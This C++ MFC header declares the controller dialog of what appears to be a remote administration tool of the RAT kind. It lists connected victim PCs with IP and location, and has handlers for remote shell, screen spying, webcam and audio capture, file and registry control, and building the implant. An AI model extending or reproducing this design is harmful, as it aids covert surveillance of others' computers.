
// MyRemoteDlg.h: 头文件
//

#pragma once
#include "TrueColorToolBar.h"
#include "include/IOCPServer.h"
#include "SEU_QQwry.h"
#include "CShellDlg.h"
#include "CProcessDlg.h"
#include "CWindowsDlg.h"
#include "CScreenSpyDlg.h"
#include "CFileManagerDlg.h"
#include "CAudioDlg.h"
#include "CCreatServerDlg.h"
#include "CServerDlg.h"


// CMyRemoteDlg 对话框
class CMyRemoteDlg : public CDialogEx
{
// 构造
public:
	CMyRemoteDlg(CWnd* pParent = nullptr);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_MYREMOTE_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;
	CStatusBar  m_StatusBar;  //定义状态栏变量
	CTrueColorToolBar m_ToolBar;       //定义一行位图化按钮和可选分隔符的控件条变量,这是一个别人定义好的类，继承了ToolBar
	int Online_Pc_Count;		//定义上线数量的一个变量
	NOTIFYICONDATA NotifIconDate;  //定义系统托盘变量
	
	SEU_QQwry* m_QQwry;		//用于显示pc机的地域信息

	CBitmap				m_BitmapPicUp;
	CStatic				m_PicUp;		// 左上角图片

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()

public:
	CListCtrl m_CList_Online;
	CListCtrl m_CList_Message;
	//界面缩放变换
	afx_msg void OnSize(UINT nType, int cx, int cy);
	//初始化两个列表
	int InitList();
	// 添加上线机器的部分信息
	void Add_Online_Message(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing, ClientContext* pContext);
	//添加日志的部分信息
	void Add_Log_Message(BOOL IsSuccess, CString strLogMsg);
	// 测试是否能正常添加信息。
	void test();
	//Online列表界面内右键显示菜单栏
	afx_msg void OnNMRClickOnline(NMHDR* pNMHDR, LRESULT* pResult);


	//Online菜单栏选项处理函数
	afx_msg void OnOnlineCmd();
	afx_msg void OnOnlineProcess();
	afx_msg void OnOnlineWindow();
	afx_msg void OnOnlineVideo();
	afx_msg void OnOnlineDesktop();
	afx_msg void OnOnlineFile();
	afx_msg void OnOnlineAudio();
	afx_msg void OnOnlineServer();
	afx_msg void OnOnlineRegistry();
	afx_msg void OnOnlineDelete();

	//为主菜单添加一个菜单
	void Add_Main_Menu();
	//主菜单栏选项处理函数
	afx_msg void OnMainClose();
	afx_msg void OnMainAbout();
	afx_msg void OnMainServerBuild();
	afx_msg void OnMainSet();

	//添加状态栏
	void Add_status_bar();
	//添加工具栏
	void Add_ToolBar();
	// 添加系统托盘
	void Add_System_Tray();

	//自定义消息
	//系统托盘的自定义消息函数
	afx_msg void OnIconNotify(WPARAM wParam, LPARAM lParam);
	//向列表添加真实上线pc机的信息的自定义消息处理函数
	afx_msg LRESULT OnOnlineAddToList(WPARAM, LPARAM);
	//接收到终端管理消息，处理这个消息的函数
	afx_msg LRESULT OnOpenShellDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenProcessDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenWindowsDialog(WPARAM, LPARAM);
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenManagerDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenServerDialog(WPARAM, LPARAM);

	//系统托盘菜单的消息处理函数
	afx_msg void OnSystrayClose();
	afx_msg void OnSystrayShow();

	//主窗口Close消息的处理函数
	afx_msg void OnClose();
	// 在工具栏左边添加一个图片
	void Add_Up_Picture();
	// 添加OnlineList控件的背景图
	void Add_OnlineList_Background();
	

protected:
	//回调函数，处理socket的所有消息
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
	//建立服务端，设置端口。
	void Activate(UINT nPort, UINT nMaxConnections,CString nIp);
	//处理所有客户端发送来的消息
	static void CMyRemoteDlg::ProcessReceiveComplete(ClientContext* pContext);
public:
	// 根据ini文件添加监听端口
	void ListenPort();
private:
	//统一处理发送给客户端的消息，属于什么类型，比如说终端控制，进程控制
	void SendSelectCommand(PBYTE pData, UINT nSize);
};



